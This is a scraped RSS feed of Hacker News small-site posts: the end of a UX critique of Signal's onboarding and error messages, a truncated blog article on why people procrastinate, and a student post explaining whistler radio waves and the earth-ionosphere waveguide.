<p><img width="720" height="351" src="https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailedlabel-1024x499.jpg" alt="" srcset="https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailedlabel-1024x499.jpg 1024w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailedlabel-300x146.jpg 300w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailedlabel-768x374.jpg 768w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailedlabel-100x49.jpg 100w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailedlabel-700x341.jpg 700w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINcreationfailedlabel.jpg 1125w" sizes="(max-width: 720px) 100vw, 720px"> </p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="217ba5d" data-element_type="section">
<div>
<div>
<div data-id="0930f87" data-element_type="column">
<div>
<div>
<div data-id="887f924" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>1: </b><strong>What just happened</strong> <strong>—</strong> it’s clear right away what the error was (in plain English, not an obscure code).</p>
</div>
</div>
<div data-id="c0b9985" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>2: </b><strong>Why this affects you —</strong> this is the result of that error, and why you should care.</p>
</div>
</div>
<div data-id="441f04d" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>3: </b><strong>What happens next —</strong> this is how the error will be handled. Without the promise of this automatic reminder, the user may be <em>anxious</em> about having to <em>remember</em> to set a PIN in the future.</p>
</div>
</div>
<div data-id="e514ae9" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>4: </b><strong>Here’s the next action —</strong> this gives the user a clear next action, and lets them continue <span><em>using the app as normal</em></span>.&nbsp;</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="af3922d" data-element_type="section">
<div>
<div>
<div data-id="9036c76" data-element_type="column">
<div>
<div>
<div data-id="95da975" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Most of the time when designing software, people don’t remember (or don’t want to invest the time into) good error handling.</p>
</div>
</div>
<div data-id="e09eeb3" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>I see this (left) all the time:</p>
</div>
</div>
<div data-id="d11af55" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="1200" height="346" src="https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINgoodbad.jpg" alt="" srcset="https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINgoodbad.jpg 1200w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINgoodbad-300x87.jpg 300w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINgoodbad-1024x295.jpg 1024w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINgoodbad-768x221.jpg 768w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINgoodbad-100x29.jpg 100w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/PINgoodbad-700x202.jpg 700w" sizes="(max-width: 1200px) 100vw, 1200px"> </p>
</div>
</div>
<div data-id="8642f09" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><strong>Tip</strong>: if you’re building software, it’s worth the investment to handle errors well.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="eb1623d" data-element_type="section">
<div>
<div>
<div data-id="6e68d73" data-element_type="column">
<div>
<div>

<div data-id="e40f075" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>There’s an onboarding strategy which can be difficult to get right, often backfires if done incorrectly but has the potentially to be immensely rewarding: <strong>encouraging discovery</strong>.</p>
</div>
</div>
<div data-id="ca7368e" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>The feeling of using an app and stumbling upon a ‘hidden’ feature is enjoyable and addictive. It gives depth to a product, that otherwise might have appeared quite shallow.</p>
</div>
</div>
<div data-id="895a81b" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>Great UX is built on these <strong>moments of discovery</strong>, and Signal nailed it with their ‘Note to self’ feature.</p>
<p>…</p></div>
</div>
</div>
<div data-id="f5cfc7c" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>If you go to start a new message, and search for ‘S’…</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="e5ecbc8" data-element_type="section">

</section>
<section data-id="00b9c9b" data-element_type="section">
<div>
<div>
<div data-id="78c8e8a" data-element_type="column">
<div>
<div>
<div data-id="167a1ad" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>You can now privately send messages to yourself—and yes, it’s very similar to the ‘your space’ feature on Slack.</p>
</div>
</div>
<div data-id="4768c05" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>But the point isn’t that it’s innovative, it’s that Signal took a ‘hands off’ approach, and let the user stumble across this in their own time.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="c3775ca" data-element_type="section">
<div>
<div>
<div data-id="24d45fe" data-element_type="column">
<div>
<div>
<section data-id="76c8852" data-element_type="section">
<div>
<div>
<div data-id="fa135b5" data-element_type="column">
<div>
<div>
<div data-id="85d2661" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><strong>✅ When this technique works</strong></p>
</div>
</div>
</div>
</div>
</div>

</div>
</div>
</section>
<section data-id="c9e9950" data-element_type="section">
<div>
<div>
<div data-id="086457e" data-element_type="column">
<div>
<div>
<div data-id="bea716f" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><strong>Additional features</strong> which <span><strong>aren’t</strong></span> required to get the core value from the product.</p>
</div>
</div>
</div>
</div>
</div>
<div data-id="2997173" data-element_type="column">
<div>
<div>
<div data-id="4666c5a" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Core features which need to be <strong>understood immediately</strong>.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="6c5ee20" data-element_type="section">
<div>
<div>
<div data-id="459c4ed" data-element_type="column">
<div>
<div>
<div data-id="525c40f" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Features that would be used <strong>infrequently</strong>, or have a <em>relatively</em> <strong>low ‘value’</strong> to the user.</p>
</div>
</div>
</div>
</div>
</div>
<div data-id="3b8ffe5" data-element_type="column">
<div>
<div>
<div data-id="153424f" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Features that would make their experience <strong>considerably better</strong> <em>(it’d be annoying to find a game-changing feature after using the product for a year)</em>.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="900b66a" data-element_type="section">
<div>
<div>
<div data-id="63ecc57" data-element_type="column">
<div>
<div>
<div data-id="f5ac8a0" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>The nuance here is to know when to proactively teach someone how to use a feature, and when to let them discover it on their own.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="454fa41" data-element_type="section">
<div>
<div>
<div data-id="6975806" data-element_type="column">
<div>
<div>
<div data-id="8ac1234" data-element_type="widget" data-widget_type="heading.default">
<p>
<h3>5. Friction is your Achilles heel</h3> </p>
</div>
<div data-id="faf43aa" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Here are two reasons why word of mouth is so important to Signal:</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="d3b7db1" data-element_type="section">
<div>
<div>
<div data-id="2097cbc" data-element_type="column">
<div>
<div>
<section data-id="18ea3dd" data-element_type="section">
<div>
<div>

<div data-id="7e6f3ee" data-element_type="column">
<div>
<div>
<div data-id="f668bb0" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><strong>1. WhatsApp and Signal are substitute goods</strong></p>
<p>i.e., most people probably won’t routinely use both in the long term.</p></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="6173dc2" data-element_type="section">
<div>
<div>

<div data-id="0ac9744" data-element_type="column">
<div>
<div>
<div data-id="c68a194" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p><b>2. The network effect</b></p>
<p>i.e., they both get more valuable when more people in their network also have them. For Signal to be as useful as WhatsApp, you also need your friends to switch.</p></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="388b8b4" data-element_type="section">
<div>
<div>
<div data-id="5efa7e7" data-element_type="column">
<div>
<div>
<div data-id="55898f5" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Which introduces a UX challenge: how can you design an experience which maximises the number of new users that then bother to invite all of their friends?</p>
</div>
</div>
<div data-id="697f561" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Certainly an influential factor is how much effort it takes to<strong> create an account </strong>(people are more likely to share things that they thought were easy to do).</p>
</div>
</div>
<div data-id="665fa77" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>Signal should be designing a process that gets the user to a point where they feel like they’ve replaced WhatsApp, in as few steps as possible.</p>
<p>…</p></div>
</div>
</div>
<div data-id="70e9d28" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>That means removing anything from the initial onboarding experience that doesn’t directly help the user get to that milestone.</p>
</div>
</div>
<div data-id="011a5c2" data-element_type="widget" data-widget_type="image.default">
<div>
<p><img width="1200" height="680" src="https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/unnecessaryactions.jpg" alt="" srcset="https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/unnecessaryactions.jpg 1200w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/unnecessaryactions-300x170.jpg 300w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/unnecessaryactions-1024x580.jpg 1024w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/unnecessaryactions-768x435.jpg 768w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/unnecessaryactions-100x57.jpg 100w, https://428579-1344919-1-raikfcquaxqncofqfm.stackpathdns.com/wp-content/uploads/2021/01/unnecessaryactions-700x397.jpg 700w" sizes="(max-width: 1200px) 100vw, 1200px"> </p>
</div>
</div>
<div data-id="79905d8" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>And yes, having to decide whether or not to give Signal permission to access all the devices in your house <em>does</em> take effort.</p>
</div>
</div>
<div data-id="4bc8b4c" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>It’s not just the physical action of reading the modal and then clicking a button, but the cognitive attention required to make a <strong><em>decision</em></strong>.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section data-id="5ca2466" data-element_type="section">
<div>
<div>
<div data-id="36f741d" data-element_type="column">
<div>
<div>

<div data-id="7af0a0c" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>I spent about 40 hours using, analysing and writing up my experience of using Signal, and—in addition to the privacy angle—there’s certainly a lot to like:</p>
</div>
</div>
<div data-id="d25de0b" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>1: </b><em>Some</em> of the error handling was great.</p>
</div>
</div>
<div data-id="2b28cb8" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>2: </b>I was delighted to stumble across the ‘Notes to self’ feature.</p>
</div>
</div>
<div data-id="65ed34b" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>3: </b>The core product is very similar to WhatsApp, which is a good thing.</p>
</div>
</div>
<div data-id="4861b42" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>But there’s still a lot of work to do, and dare I say it; <strong>the UX wasn’t as good as WhatsApp’s</strong>.</p>
</div>
</div>
<div data-id="60f3cc8" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>I created a new WhatsApp account to test the most recent version, and I don’t think anybody can deny that their product is world-class.</p>
</div>
</div>
<div data-id="691acb3" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Signal <em>could</em> get there, and to start they should improve the following:</p>
</div>
</div>
<div data-id="691e03a" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>1: </b>For an app so focused on privacy, they do a really poor job of asking for permission to access your <em>stuff</em>. It’s often totally out of context.</p>
</div>
</div>
<div data-id="212ee75" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>2: </b><em>Some</em> of the error handling was really poor.</p>
</div>
</div>
<div data-id="dde9f91" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p><b>3: </b>Remove any unnecessary steps, so the process of replacing WhatsApp <em>feels</em> easier.</p>
</div>
</div>
<div data-id="ba59ed1" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>When the hype around Signal dies down, and people are trying to get all their friends to migrate from WhatsApp to Signal, it’ll be the UX that makes all the difference.</p>
<p>…</p></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section></div>]]>
            </description>
            <link>https://builtformars.com/creating-an-account-with-signal/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25831509</guid>
            <pubDate>Tue, 19 Jan 2021 09:23:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Reason We Procrastinate and How to Stop]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25831140">thread link</a>) | @jonmal
<br/>
January 19, 2021 | https://blog.doit.io/procrastinate/ | <a href="https://web.archive.org/web/*/https://blog.doit.io/procrastinate/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

           <!-- 
            <figure class="post-full-image">
                <img
                    srcset="/content/images/size/w300/2020/11/Procrastinate.jpg 300w,
                            /content/images/size/w600/2020/11/Procrastinate.jpg 600w,
                            /content/images/size/w1000/2020/11/Procrastinate.jpg 1000w,
                            /content/images/size/w2000/2020/11/Procrastinate.jpg 2000w"
                    sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px"
                    src="/content/images/size/w600/2020/11/Procrastinate.jpg"
                    alt="Unpacking Procrastination: The Real Reason We Procrastinate and How to Stop Today and Everyday"
                />
            </figure>
            -->

            <section>
                <div>
                    <p>We have all been there. A huge deadline is looming and you have yet to take one step towards completing the project. You are given months to prepare for a big meeting or event and you wait until the last minute to sort out all the details.</p><p>It’s the night before a two week trip overseas and you finally make a list of items to pack in your suitcase. We all procrastinate some of the time and some of us procrastinate most of the time.</p><p>You can click the links below to jump to a particular section or simply scroll down to read everything.</p><h3 id="the-meaning-behind-procrastinate">The meaning behind procrastinate</h3><ol><li><a href="#what-is-procrastination">What is Procrastination?</a></li><li><a href="#the-real-reason-we-procrastinate">The Real Reason We Procrastinate</a></li><li><a href="#the-problem-with-procrastination">The Problem with Procrastination</a></li></ol><h3 id="techniques-to-stop-procrastinating-today">Techniques to Stop Procrastinating Today</h3><ol><li><a href="#1-short-list">Short List</a></li><li><a href="#2-digitally-declutter">Digitally Declutter</a></li><li><a href="#3-bundle-up">Bundle Up</a></li><li><a href="#4-set-a-timer">Set a Timer</a></li><li><a href="#5-worst-thing-first">Worst Thing First</a></li></ol><h3 id="overcoming-procrastination">Overcoming Procrastination </h3><ol><li><a href="#the-key-to-overcoming-procrastination-for-good">The Key to Overcoming Procrastination for Good</a></li><li><a href="#practicing-and-improving-emotional-self-regulation">Practicing and Improving Emotional Self-Regulation</a></li></ol><figure><img src="https://blog.doit.io/content/images/2020/11/Procrastinate-1.jpg" alt="Why we procrastinate" srcset="https://blog.doit.io/content/images/size/w600/2020/11/Procrastinate-1.jpg 600w, https://blog.doit.io/content/images/size/w1000/2020/11/Procrastinate-1.jpg 1000w, https://blog.doit.io/content/images/2020/11/Procrastinate-1.jpg 1200w" sizes="(min-width: 720px) 720px"><figcaption>Why we procrastinate</figcaption></figure><p>Dr. Joseph Ferrari is a leading researcher and author on the subject of procrastination. His data show that an <a href="https://www.apa.org/news/press/releases/2010/04/procrastination">estimated 20% of men and women</a> in the U.S. are chronic procrastinators. </p><p><strong>Darius Foroux</strong> is a writer on the topic of productivity. He surveyed over two thousand professionals and found that <a href="https://medium.com/darius-foroux/how-common-is-procrastination-a-study-80869467c3f3">88% of them had procrastinated</a> for at least one hour on the previous day. The research is clear. Big or small, a little bit or habitual, procrastination is a problem that plagues productivity. </p><p>At Doit we help you get things done. If procrastination is getting in the way of doing your to-do list, this article is for you. This guide shares the surprising real reason we procrastinate, presents ideas to stop procrastinating and start doing <em>now</em>, and practices for getting out of the procrastination habit for good. Let’s do it.</p><h2 id="what-is-procrastination">What is Procrastination?</h2><p>Oxford Languages defines procrastination as “the act of postponing or delaying something.” That simple definition shows that procrastination is far reaching. It is not limited to school work or professional projects or personal obligations. Procrastination is omnipresent and can happen in every aspect of our lives.</p><p>College students are notorious procrastinators. Research papers and study sessions are put off until mere hours before the assignment is due or the test is administered. At work, professionals wait until the day before a big presentation to put together their speaking notes and infographics. Patients with anxiety about dental work put off seeing a dentist year after year until unavoidable pain pushes them to make an appointment.</p><p>The basic meaning leaves out an important aspect of procrastination illustrated by the examples above. When we procrastinate, we typically put off something that we find difficult, challenging, or uncomfortable in favor of something easier or more appealing. &nbsp;A week before a deadline, we readily wander onto a social media feed or grab a snack or make a phone call to a friend. The day before that deadline, things look very different. We wait until we have no choice but to dive in and take care of the suddenly pressing problem, project, or task.</p><p>People who procrastinate are often mislabeled as lazy. Many of us even engage in self talk about how lazy or unfocused we are when we engage in procrastination. But procrastination is not a reflection of someone’s work ethic or their ability to focus. There’s more to it than that.</p><!--kg-card-begin: markdown--><blockquote>
<p><span>When we procrastinate, we typically put off something that we find difficult, challenging, or uncomfortable in favor of something easier or more appealing.</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>Chronic procrastinators know that waiting will cause more harm than good. We know that this choice will ultimately lead to a worse outcome for us physically, emotionally, and otherwise, but we do it anyway. The Ancient Greeks called this state of mind “acrasia.” Our modern understanding of procrastination finds its roots in this bygone term, which means <strong>doing something “against your better judgement.” </strong></p><p>Why, oh why, would we put off the mere <em>potential</em> for pain today when we know with certainty it will cause worse suffering down the road? There are scientific theories behind that and they have nothing to do with work ethic or time management or motivation. The reasons are, surprisingly, rooted in our emotions.</p><h2 id="the-real-reason-we-procrastinate">The Real Reason We Procrastinate</h2><p>Dr. Fuschia Sirois is a professor of psychology at the University of Sheffield. She <a href="https://www.nytimes.com/2019/03/25/smarter-living/why-you-procrastinate-it-has-nothing-to-do-with-self-control.html?login=email&amp;auth=login-email">told The New York Times</a>, “It doesn’t make sense to do something you know is going to have negative consequences.” She added, “ “People engage in this irrational cycle of chronic procrastination because of an inability to manage negative moods around a task.”</p><p>Dr. Tim Pychyl is also a professor of psychology and a member of the Procrastination Research Group at Carleton University in Ottawa. He said, “Procrastination is an emotion regulation problem, not a time management problem.” <a href="http://eprints.whiterose.ac.uk/91793/1/Compass%20Paper%20revision%20FINAL.pdf">Sirois and Pychyl teamed up in 2013</a> to research the notion that people place a priority on their immediate emotional needs over those of their future selves via procrastination. Here’s what they concluded.</p><!--kg-card-begin: markdown--><blockquote>
<p><span>People engage in this irrational cycle of chronic procrastination because of an inability to manage negative moods around a task.</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>When faced with an “aversive” task, i.e. something that we find “boring, frustrating, lacking in meaning and/or structure,” we react with negative feelings and moods. Then we have a choice. We can get through those feelings and moods via “self-regulation” or we can succumb to the immediately protective choice of procrastination. Most of us choose the short-term solution. Avoiding the task gives us an emotional lift. We feel better. So we do it, or rather, <em>avoid doing it</em>, again and again. And before we know it, we are chronically procrastinating.</p><h2 id="the-problem-with-procrastination">The Problem with Procrastination</h2><p>Sirois and Pychyl’s research shows that our future selves are paying a dear price for the short-term gratification we receive when we put things off. We aren’t dismissing our future selves as being unimportant or anything. We are just absolutely convinced that our future self will be better able to handle the given task.</p><p>We believe that when we sit down to work tomorrow, or next week, or next month before the big deadline, we will <em>feel</em> like doing it. But we are wrong. When we choose the temporary <a href="https://blog.doit.io/how-to-stay-focused-when-you-get-bored-working-toward-your-goals/">reprieve from boredom</a>, frustration, or challenge and kick the can down the road to our future selves, we are only making matters cumulatively worse.</p><!--kg-card-begin: markdown--><blockquote>
<p><span>We aren’t dismissing our future selves as being unimportant or anything. We are just absolutely convinced that our future self will be better able to handle the given task.</span></p>
</blockquote>
<!--kg-card-end: markdown--><p>For one thing, a constant current of anxiety and tension will be along for the entire procrastination ride. This nagging looming deadline will be churning in the background, coloring our daily mood and impacting our health and well being. The negative feelings we have about the task itself make us procrastinate. That, in turn, leads to ruminating negative thoughts about the act of procrastination itself. It’s a cycle that has a snowball effect, gathering more self blame, shame, anxiety, and stress along the way.</p><p>For another, when we finally decide it’s “go time,” our job is much more daunting than it was before. We now have to take on a monumental task instead of one that is simply boring or frustrating. We will be faced with cramming a month’s worth of work into just a day or two. We won’t eat right, we sure won’t sleep right, our stress levels will soar, and our minds and bodies will suffer as a result.</p><p>It’s like credit card debt. The bill is going to come due. We can pay the full balance now, which is going to put a dent in our immediate account. Or, we can allow it to grow bigger and bigger as the interest charges stack up, costing us way more every single step along the way. Chronic procrastinators put it all on credit and pay significantly more in the end.</p><h2 id="5-techniques-to-stop-procrastinating-today">5 Techniques to Stop Procrastinating Today</h2><p>When we think about breaking free from the bad habit of procrastination, we benefit from taking a multipronged approach. We have a better chance of succeeding when we look at short term, immediate techniques as well as changes we can make in the long run that will help us make chronic procrastination a permanent part of our past. First, let’s look at ways to find immediate relief from putting a task off so we can get going at getting it done. </p><h3 id="1-short-list">1. Short List</h3><p>There is a reason why to-do lists stand the test of time when it comes to organization and productivity. They work! This list technique is all about keeping it short and simple.</p><p>Make a list of 3-6 things that you want to get done during your next work period. Put them in <a href="https://blog.doit.io/the-myth-of-multitasking/">order of the most important</a> or time sensitive to the least important or time sensitive. Start working on the first task until it is finished. Check it off, mark it out, and move to the next item. Keep going until your work session ends. Move any tasks that are left undone to the new list you will create for your next session.</p><p>The new list should also be put in priority order. Lower priority tasks that are not time sensitive may be copied over to the bottom spot from list to list for days or even weeks! Don’t beat yourself up about it. Just keep it on the list until you get to it.</p><p>A note on timing: Some people like to make their list at the end of the previous work day or session. If you tend to ruminate at night and lose sleep when a list is running through your mind, plan to make the list as soon as you enter your work space the next day instead.</p><h3 id="2-digitally-declutter">2. Digitally Declutter</h3><p>Let’s face it. Distractions are very easily found these days. If you tend to wander into social media or headline news or your personal inbox instead of working on the more pressing task at hand, it’s time to digitally declutter your workspace.</p><p>The idea here is to make it harder to get distracted by removing the devices that hold those distractions. So, let’s say you need to create an outline for an upcoming …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.doit.io/procrastinate/">https://blog.doit.io/procrastinate/</a></em></p>]]>
            </description>
            <link>https://blog.doit.io/procrastinate/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25831140</guid>
            <pubDate>Tue, 19 Jan 2021 08:24:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nature’s Electromagnetic Symphony – Whistlers]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25830624">thread link</a>) | @aklsh
<br/>
January 18, 2021 | https://aklsh.now.sh/blog/whistlers/ | <a href="https://web.archive.org/web/*/https://aklsh.now.sh/blog/whistlers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
              


<p><em>Guest Author</em>: <a href="https://github.com/sreekarsr">Sreekar</a></p>

<p>As part of a course on <a href="http://www.ee.iitm.ac.in/uday/2019b-EE2025/index.html">Engineering Electromagnetics</a> in the Fall 2019 semester, we had to make a poster on a topic of our interest which involved electromagnetics, which we had to present at our department, on a fine Saturday afternoon (19.10.2019).</p>

<h2 id="how-did-we-come-up-with-this-topic">How did we come up with this topic?<a href="#how-did-we-come-up-with-this-topic">#</a></h2>

<p>With my exams of the course having gone really bad (I still have nightmares about it :( ), I was determined to make my group’s poster one of the best that will be put up on poster day. The three of us, Sreekar, <a href="https://www.linkedin.com/in/nithin-varma-17ba3b174">Nithin Varma</a> and I searched the internet for a topic that was “unconventional” and interesting. After a week or so of <a href="https://en.wikipedia.org/wiki/Wikipedia:Wiki_Game">following links on Wikipedia</a>, I came across this article - <a href="https://en.wikipedia.org/wiki/Whistler_(radio)">Whistler (radio)</a>, which caught my eye. It was a topic that most would have not heard about and would be very much interested in learning about it. Bazinga!</p>

<p>Meanwhile, Sreekar had come up with <a href="https://en.wikipedia.org/wiki/Birefringence">Birefringence</a>, which also seemed interesting. None of us had heard about it before. With these two topics in mind, we asked our instructor, <a href="https://sites.google.com/a/ee.iitm.ac.in/deepav/">Dr. Deepa Venkitesh</a> for her opinion and she asked us to go with the former.</p>

<p>Before I start explaining the technical details of the poster, do take a look at the poster we made (click on it for a PDF).
<a href="https://aklsh.now.sh/blog/Whistler%20post/poster.pdf" type="application/pdf"><img src="https://aklsh.now.sh/blog/Whistler%20post/poster.png" alt="Our Poster" width="100%"></a>
</p><p><a href="https://aklsh.now.sh/blog/Whistler%20post/poster.pdf" type="application/pdf">Our Poster</a></p>

<p>So here it goes.</p>

<h2 id="technical-details-of-the-poster">Technical Details of the Poster<a href="#technical-details-of-the-poster">#</a></h2>

<h3 id="history-and-discovery">History and Discovery<a href="#history-and-discovery">#</a></h3>

<p>In World War I, soldiers used long communication lines to maintain contact with their base. The people on the receiving side of the line, often could hear sounds that were very similar to that of <em>“falling grenades”</em>, when there were none falling. One keen observation was that this particular sound was heard during the times of lightning strikes.</p>

<p>Here’s a short sound clip of what they heard:</p>

<table>
<thead>
<tr>
<th><a href="https://aklsh.now.sh/blog/Whistler%20post/Audio/whistler.mp3">Audio Clip 1</a></th>
<th><a href="https://aklsh.now.sh/blog/Whistler%20post/Audio/chorus.mp3">Audio Clip 2</a></th>
</tr>
</thead>

<tbody>
</tbody>
</table>

<p>Courtesy: <i>NASA Van Allen Probes</i></p>

<p>The first one, in which you would have noticed a tone of descending frequency, is called a <strong>Whistler</strong>, while the second, which consists of rising and falling tones of frequency is a <strong>Chorus</strong>. This post will talk more on whistlers as they are more extensively studied among the two.</p>

<p><strong>Whistlers</strong> are Very Low Frequency (VLF) emissions in the atmosphere that are characterised by a <em>tone of rapidly descending frequencies</em>.</p>

<p>Being long-wavelength (~ 100 km!!) <em>EM Waves</em>, it’s understandable that they couple into communication lines that are as long as 100 km. This explains the strange noises heard by soldiers in WWI.</p>

<h3 id="sources-and-generation-of-whistlers">Sources and generation of whistlers<a href="#sources-and-generation-of-whistlers">#</a></h3>

<p>A natural question to ask is how these waves are generated in the first place. The literature on this is limited, but there is considerable evidence to say that the source of whistlers must be not very different from lightning.</p>

<p>The only known characteristic of whistlers that distinguishes it from ordinary lightning is their relatively high energy content. After accounting for attenuation losses, the estimated electromagnetic energy in a whistler producing stroke is about ten times as great as that in the average lightning flash. A sufficiently strong lightning flash should be able to produce whistler-mode signals.</p>

<p>But here’s the thing - we also detect these waves at locations where there may be no lightning at all. In fact, these waves can also be detected at places whose <em>magnetically conjugate point</em> has experienced a lightning strike. That means that there must be some <em>mode of propagation</em> that is making this possible. The theory behind it’s propagation can be intuitively understood using the basic concepts of a waveguide.</p>

<h3 id="waveguides">Waveguides<a href="#waveguides">#</a></h3>

<p>To the uninitiated, here’s the wikipedia definition of a waveguide:</p>

<blockquote>
<p>A waveguide is a structure that guides waves, such as electromagnetic waves or sound, with minimal loss of energy by restricting expansion to one dimension or two. Without the physical constraint of a waveguide, wave amplitudes decrease according to the inverse square law as they expand into three dimensional space.</p>
</blockquote>

<!-- pic of waveguide -->

<p>It literally is in the name - It “guides” waves, sort of like a tunnel (over-simplified). One very popular waveguide is the ubiquitous <a href="https://en.wikipedia.org/wiki/Optical_Fibre">optical fibre</a>.</p>

<p>The simplest idealised case of a waveguide is a <em>parallel plate waveguide</em>, in which the wave is constrained between <em>two conductors</em>. Solving Maxwell’s equations and applying boundary conditions will give us a solution which has a wave that propagates in a direction tangential to the plates.</p>

<p>Now, consider the earth and the ionosphere. The earth is a good conductor, in the sense that at the frequencies we are talking about (KHz), the <a href="https://en.wikipedia.org/wiki/Dielectric_loss#Loss_tangent">loss tangent</a>, is about 600.</p>

<p>The ionosphere, as its name suggests, has a lot of ions, making it a good conductor as well. What we now have is a waveguide through which EM waves, more specifically VLF waves, can be guided through.</p>

<h3 id="propagation-of-whistlers">Propagation of Whistlers<a href="#propagation-of-whistlers">#</a></h3>

<p>Energy from a lightning source near the earth’s surface travels in the earth-ionosphere waveguide and enters the ionosphere continuously along the lower surface of the ionosphere. Wave components that enter the ionosphere at the location of a duct are then trapped and “conveyed” to the opposite hemisphere along the same magnetic line of force, which are aligned exactly along the duct, where they emerge from the ionosphere and re-enter the earth-ionosphere waveguide.</p>

